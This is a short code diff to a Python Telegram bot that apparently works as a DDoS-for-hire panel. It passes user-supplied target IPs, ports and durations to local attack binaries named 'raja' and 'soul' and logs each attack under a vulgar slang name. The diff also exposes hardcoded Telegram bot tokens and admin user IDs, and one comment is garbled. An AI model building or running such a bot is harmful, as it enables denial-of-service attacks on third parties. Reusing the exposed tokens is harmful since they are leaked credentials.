@@ -13,7 +13,7 @@ from dateutil.relativedelta import relativedelta
 import time
 
 # Idef create_random_key()nsert your Telegram bot token here
-bot = telebot.TeleBot('7526087286:AAHPMyoPdnhOi48UjQZp40_DTuMZxK4x0rU')
+bot = telebot.TeleBot('7526087286:AAHTmtCagqJLI1y5STlAFHF4aE68efBQbDA')
 
 # Admin user IDs
 admin_id = {"5834054446","7353797869"}
@@ -297,7 +297,7 @@ def process_chudai_details(message):
             else:
                 # Log the chudai with correct variable name
                 log_command(user_id, target, port, chudai_time)
-                full_command = f"./raja {target} {port} {chudai_time} {10} {1200}"  # ✅ Correct variable name
+                full_command = f"./soul {target} {port} {chudai_time} 30"  # ✅ Correct variable name
 
                 username = message.chat.username or "No username"
 
